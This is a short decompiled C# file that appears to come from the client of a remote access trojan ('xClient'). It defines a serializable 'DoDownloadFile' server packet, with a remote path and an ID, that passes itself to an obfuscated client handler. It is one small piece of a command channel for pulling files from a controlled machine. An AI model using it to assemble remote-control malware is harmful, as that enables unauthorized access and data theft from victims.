using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoDownloadFile : GInterface4
{
	public string RemotePath { get; set; }

	public int ID { get; set; }

	public DoDownloadFile()
	{
	}

	public DoDownloadFile(string remotepath, int id)
	{
		RemotePath = remotepath;
		ID = id;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
